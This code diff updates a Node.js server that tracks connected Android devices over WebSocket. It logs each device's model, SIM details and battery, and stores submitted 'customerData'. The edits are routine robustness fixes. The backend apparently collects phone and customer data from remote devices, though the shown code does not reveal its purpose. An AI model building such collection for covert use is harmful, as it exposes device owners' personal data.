@@ -15,7 +15,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });
 
 let MONGO_URI = process.env.MONGO_URI || '';
-// Clean MONGO_URI from common env issues
 if (MONGO_URI) {
     MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim();
 }
@@ -29,7 +28,7 @@ if (!MONGO_URI) {
     mongoose.connect(MONGO_URI, {
       serverSelectionTimeoutMS: 5000,
       connectTimeoutMS: 10000,
-      writeConcern: { w: 1 } // Fixed: Use w: 1 to avoid replica set issues
+      writeConcern: { w: 1 }
     }).then(() => {
       dbConnected = true;
       console.log('✅ MongoDB connected successfully');
@@ -46,7 +45,7 @@ const deviceSchema = new mongoose.Schema({
   androidVersion: String,
   sim1: String,
   sim2: String,
-  battery: Number,
+  battery: { type: Number, default: 0 },
   isOnline: Boolean,
   lastSeen: Date,
   isPinned: Boolean,
@@ -163,17 +162,21 @@ wss.on('connection', (ws, req) => {
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
 
+      // Fix: Handle NaN battery values
+      let batteryVal = parseInt(data.battery);
+      if (isNaN(batteryVal)) batteryVal = 0;
+
       const update = { 
           $set: { 
               deviceId: id, 
               isOnline: true, 
               lastSeen: new Date(),
-              model: data.model,
-              androidVersion: data.androidVersion,
-              sim1: data.sim1,
-              sim2: data.sim2,
-              battery: Number(data.battery),
-              serialNumber: data.serialNumber
+              model: data.model || 'Unknown',
+              androidVersion: data.androidVersion || 'N/A',
+              sim1: data.sim1 || 'N/A',
+              sim2: data.sim2 || 'N/A',
+              battery: batteryVal,
+              serialNumber: data.serialNumber || id
           } 
       };
 
@@ -181,7 +184,6 @@ wss.on('connection', (ws, req) => {
       if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
 
       if (dbConnected) {
-          // Fixed upsert logic
           await Device.findOneAndUpdate(
             { $or: [{ deviceId: id }, { serialNumber: id }] },
             { ...update, $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false, isPinned: false } },
